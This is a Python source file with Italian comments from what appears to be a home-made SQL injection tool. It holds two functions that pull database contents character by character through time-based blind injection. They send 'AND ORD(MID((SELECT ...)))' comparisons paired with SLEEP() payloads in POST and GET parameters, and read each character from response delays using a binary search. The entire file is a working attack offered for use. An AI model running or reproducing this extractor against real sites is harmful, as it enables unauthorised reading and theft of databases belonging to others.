import OptionConfiguration
import requests
import time
import sqliAttack
datafinale={}

def ricostruisciParolaPOST(i,nomeTabella,nomeColonna,indice,condizioneWhere):
    """
        funzione che dalla lunghezza della parola e dal nome della tabella
        ricostruisce la parola di per si basandomi sempre sulla ricerca binaria
        e sulla codifica decimale dei carattere ASCII
        Quindi ci basiamo sulla funzione MID per estrapolare il carattere
        e sulla funzione ORD per estrapolare la codifica ascii
        # la funzione mid funzione in modo particolare l'indice parte da 1 e arriva fino all'effettiva lunghezza
        # della stringa

    """
    value=""

    trovato=False
    min =0
    max=256

    if(OptionConfiguration.typeOfValue=="string"):
        while (trovato == False):
            if (min <= max):
                # print (min,max)
                mid= min+int((max-min)//2)
                dataToSent = OptionConfiguration.data.copy()
                # modifico il valore injectable
                if(condizioneWhere==None):
                    dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          "' AND (ORD(MID((SELECT %s FROM %s LIMIT %s,1 ),%s,1)) = %s) " % (
                                                                          nomeColonna, nomeTabella, indice,i, mid)+ \
                                                                          " AND SLEEP(%s) -- -" % (
                                                                              OptionConfiguration.timeToWait)

                else:
                    dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          "' AND (ORD(MID((SELECT %s FROM %s WHERE %s LIMIT %s,1 ),%s,1)) = %s) " % (
                                                                              nomeColonna, nomeTabella,condizioneWhere, indice, i,
                                                                              mid) + \
                                                                          " AND SLEEP(%s) -- -" % (
                                                                              OptionConfiguration.timeToWait)

                start = time.time()
                req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                req.content
                end = time.time()

                # se succede questo allora lo abbiamo trovato
                if ((end - start )> OptionConfiguration.timeToWait):
                    start = time.time()
                    req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                    req.content
                    end = time.time()

                    #print (end, start, chr(mid),req.elapsed.total_seconds())
                    # se succede questo allora lo abbiamo trovato
                    if ((end - start) > OptionConfiguration.timeToWait):
                    #carattere troato
                        trovato = True
                        value=value+chr(mid)
                        #print (("Position %s "+str(chr(mid)))%(mid))
                        break
                else:
                    dataToSent = OptionConfiguration.data.copy()
                    if(condizioneWhere==None):
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                          OptionConfiguration.valueInjectable] + \
                                                                          "' AND (ORD(MID((SELECT %s FROM %s LIMIT %s,1 ),%s,1)) > %s) " % (
                                                                          nomeColonna, nomeTabella, indice,i, mid) + \
                                                                          " AND SLEEP(%s) -- -" % (
                                                                              OptionConfiguration.timeToWait)
                    else:
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                                  OptionConfiguration.valueInjectable] + \
                                                                              "' AND (ORD(MID((SELECT %s FROM %s WHERE %s LIMIT %s,1 ),%s,1)) > %s) " % (
                                                                                  nomeColonna, nomeTabella,
                                                                                  condizioneWhere, indice, i,
                                                                                  mid) + \
                                                                              " AND SLEEP(%s) -- -" % (
                                                                                  OptionConfiguration.timeToWait)

                    start = time.time()
                    req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                    req.content
                    end = time.time()

                        # sono nella ,eta superiore
                    if ((end - start) > OptionConfiguration.timeToWait):
                        start = time.time()
                        req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                        req.content
                        end = time.time()

                        # sono nella ,eta superiore
                        if ((end - start) > OptionConfiguration.timeToWait):
                            min = mid + 1
                    # sono nella meta inferiore
                    else:
                        max = mid-1
            else:
                break

        # parametro intero
    else:

        while (trovato == False):
            if (min <= max):
                # print (min,max)
                mid= min+int((max-min)//2)
                dataToSent = OptionConfiguration.data.copy()

                if(condizioneWhere==None):
                    # modifico il valore injectable
                    dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                  OptionConfiguration.valueInjectable] + \
                                                              " AND (ORD(MID((SELECT %s FROM %s LIMIT %s,1 ),%s,1)) = %s) " % (
                                                                          nomeColonna, nomeTabella, indice,i, mid) + \
                                                              " AND SLEEP(%s) " % (
                                                                  OptionConfiguration.timeToWait)
                else:
                    dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          " AND (ORD(MID((SELECT %s FROM %s WHERE %s LIMIT %s,1 ),%s,1)) = %s) " % (
                                                                              nomeColonna, nomeTabella, condizioneWhere,
                                                                              indice, i,
                                                                              mid) + \
                                                                          " AND SLEEP(%s) " % (
                                                                              OptionConfiguration.timeToWait)

                start = time.time()
                req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                req.content
                end = time.time()
                # se succede questo allora lo abbiamo trovato
                #time of execution for control
                #print (end-start),chr(mid),req.elapsed.total_seconds()
                if ((end - start) > OptionConfiguration.timeToWait):

                    start = time.time()
                    req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                    req.content
                    end = time.time()
                    if ((end - start) >OptionConfiguration.timeToWait):
                        trovato = True
                        value = value + chr(mid)
                        #print (("posizione %s "+str(chr(mid)))%(i))
                        break

                        # carattere trovato
                else:
                    dataToSent = OptionConfiguration.data.copy()
                    if(condizioneWhere==None):
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          " AND (ORD(MID((SELECT %s FROM %s LIMIT %s,1 ),%s,1)) > %s) " % (
                                                                          nomeColonna, nomeTabella, indice,i, mid)+ \
                                                                          " AND SLEEP(%s)" % (
                                                                              OptionConfiguration.timeToWait)
                    else:
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          " AND (ORD(MID((SELECT %s FROM %s WHERE %s LIMIT %s,1 ),%s,1)) > %s) " % (
                                                                              nomeColonna, nomeTabella,condizioneWhere, indice, i,
                                                                              mid) + \
                                                                          " AND SLEEP(%s) " % (
                                                                              OptionConfiguration.timeToWait)


                    start = time.time()
                    req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                    req.content
                    end = time.time()

                    # sono nella ,eta superiore
                    if ((end - start) >= OptionConfiguration.timeToWait):
                        start = time.time()
                        req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                        req.content
                        end = time.time()

                        # sono nella ,eta superiore
                        if ((end - start) >= OptionConfiguration.timeToWait):
                            min = mid + 1
                    # sono nella meta inferiore
                    else:
                        max = mid-1
            else:
                break
    #Ilprint("")
    #print (OptionConfiguration.bcolors.BOLD+"value find -> "+ value+OptionConfiguration.bcolors.ENDC)
    datafinale[i] = value
    # metto nell'indice corretto proprio il valore
    # parto da 1 e non da zero

def ricostruisciParolaGET(i, nomeTabella, nomeColonna, indice,condizioneWhere):
    """funzione che dalla lunghezza della parola e dal nome della tabella
        ricostruisce la parola di per si basandomi sempre sulla ricerca binaria
        e sulla codifica decimale dei carattere ASCII
        Quindi ci basiamo sulla funzione MID per estrapolare il carattere
        e sulla funzione ORD per estrapolare la codifica ascii
        """
    # la funzione mid funzione in modo particolare l'indice parte da 1 e arriva fino all'effettiva lunghezza
    # della stringa

    value = ""
    trovato = False
    min = 0
    max = 256

    if (OptionConfiguration.typeOfValue == "string"):

        while (trovato == False):

            if (min <= max):
                # print (min,max)
                mid= min+int((max-min)//2)
                dataToSent = OptionConfiguration.data.copy()
                # modifico il valore injectable
                if(condizioneWhere==None):

                    dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                          OptionConfiguration.valueInjectable] + \
                                                                      "' AND (ORD(MID((SELECT %s FROM %s LIMIT %s,1 ),%s,1)) = %s) " % (
                                                                          nomeColonna, nomeTabella, indice,i, mid) + \
                                                                      " AND SLEEP(%s) -- -" % (
                                                                          OptionConfiguration.timeToWait)
                else:

                    dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          "' AND (ORD(MID((SELECT %s FROM %s WHERE %s LIMIT %s,1 ),%s,1)) = %s) " % (
                                                                              nomeColonna, nomeTabella, condizioneWhere,indice, i,
                                                                              mid) + \
                                                                          " AND SLEEP(%s) -- -" % (
                                                                              OptionConfiguration.timeToWait)

                data=sqliAttack.creaStringaGet(dataToSent)
                #print (data)
                start = time.time()
                req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                req.content
                end = time.time()

                # se succede questo allora lo abbiamo trovato
                #print (end-start),chr(mid),req.elapsed.total_seconds()

                if ((end - start) >= OptionConfiguration.timeToWait):
                    data = sqliAttack.creaStringaGet(dataToSent)
                    start = time.time()
                    req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                    req.content
                    end = time.time()

                    # se succede questo allora lo abbiamo trovato
                    if ((end - start) >= OptionConfiguration.timeToWait):
                        # carattere trovato
                        trovato = True
                        value = value + chr(mid)
                        #print ("posizione %s "+str(chr(mid)))%(i)
                        break
                else:
                    dataToSent = OptionConfiguration.data.copy()
                    if(condizioneWhere==None):
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          "' AND (ORD(MID((SELECT %s FROM %s LIMIT %s,1 ),%s,1)) > %s) " % (
                                                                          nomeColonna, nomeTabella, indice,i, mid) + \
                                                                          " AND SLEEP(%s) -- -" % (
                                                                              OptionConfiguration.timeToWait)
                    else:
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                                  OptionConfiguration.valueInjectable] + \
                                                                              "' AND (ORD(MID((SELECT %s FROM %s WHERE %s LIMIT %s,1 ),%s,1)) > %s) " % (
                                                                                  nomeColonna, nomeTabella,
                                                                                  condizioneWhere, indice, i,
                                                                                  mid) + \
                                                                              " AND SLEEP(%s) -- -" % (
                                                                                  OptionConfiguration.timeToWait)

                    data=sqliAttack.creaStringaGet(dataToSent)
                    start = time.time()
                    req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                    req.content
                    end = time.time()

                    # sono nella ,eta superiore
                    if ((end - start )>= OptionConfiguration.timeToWait):
                        data = sqliAttack.creaStringaGet(dataToSent)
                        start = time.time()
                        req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                        req.content
                        end = time.time()

                            # sono nella ,eta superiore
                        if ((end - start) >= OptionConfiguration.timeToWait):
                            min = mid + 1
                        # sono nella meta inferiore
                    else:
                        max = mid-1
            else:
                break


    # parametro intero
    else:

        while (trovato == False):
            if (min <= max):
                # print (min,max)
                mid= min+int((max-min)//2)
                dataToSent = OptionConfiguration.data.copy()

                # modifico il valore injectable
                if(condizioneWhere==None):
                    dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                          OptionConfiguration.valueInjectable] + \
                                                                      " AND ORD(MID((SELECT %s FROM %s LIMIT %s,1 ),%s,1)) = %s " % (
                                                                          nomeColonna, nomeTabella, indice,i, mid) + \
                                                                      " AND SLEEP(%s) " % (
                                                                          OptionConfiguration.timeToWait)
                else:
                    dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          " AND (ORD(MID((SELECT %s FROM %s WHERE %s LIMIT %s,1 ),%s,1)) = %s) " % (
                                                                              nomeColonna, nomeTabella, condizioneWhere,indice, i,
                                                                              mid) + \
                                                                          " AND SLEEP(%s) " % (
                                                                              OptionConfiguration.timeToWait)

                data=sqliAttack.creaStringaGet(dataToSent)
                start = time.time()
                req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                req.content
                end = time.time()

                # se succede questo allora lo abbiamo trovato
                if ((end - start) >= OptionConfiguration.timeToWait):
                    data = sqliAttack.creaStringaGet(dataToSent)
                    start = time.time()
                    req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                    req.content
                    end = time.time()

                    # se succede questo allora lo abbiamo trovato
                    if ((end - start) >= OptionConfiguration.timeToWait):
                        # carattere trovato
                        trovato = True
                        value = value + chr(mid)
                        #print (("Position %s "+str(chr(mid)))%(i))
                        break

                else:
                    dataToSent = OptionConfiguration.data.copy()

                    if(condizioneWhere==None):

                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          " AND ORD(MID((SELECT %s FROM %s LIMIT %s,1 ),%s,1)) > %s " % (
                                                                          nomeColonna, nomeTabella, indice,i, mid) + \
                                                                          " AND SLEEP(%s)" % (
                                                                              OptionConfiguration.timeToWait)
                    else:

                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                                  OptionConfiguration.valueInjectable] + \
                                                                              " AND (ORD(MID((SELECT %s FROM %s WHERE %s LIMIT %s,1 ),%s,1)) > %s) " % (
                                                                                  nomeColonna, nomeTabella,
                                                                                  condizioneWhere, indice, i,
                                                                                  mid) + \
                                                                              " AND SLEEP(%s) " % (
                                                                                  OptionConfiguration.timeToWait)

                    data=sqliAttack.creaStringaGet(dataToSent)
                    start = time.time()
                    req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                    req.content
                    end = time.time()

                    # sono nella ,eta superiore
                    if ((end - start )>= OptionConfiguration.timeToWait):

                        data = sqliAttack.creaStringaGet(dataToSent)
                        start = time.time()
                        req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                        req.content
                        end = time.time()

                        # sono nella ,eta superiore
                        if ((end - start) >= OptionConfiguration.timeToWait):

                            min = mid + 1
                        # sono nella meta inferiore

                    else:
                        max = mid-1
            else:
                print (OptionConfiguration.bcolors.BOLD + OptionConfiguration.bcolors.FAIL + "Error value no find " + OptionConfiguration.bcolors.ENDC)

                break

    #print("")
    #print (OptionConfiguration.bcolors.BOLD+"value find -> "+value+OptionConfiguration.bcolors.ENDC)
    #return value
    datafinale[i]=value
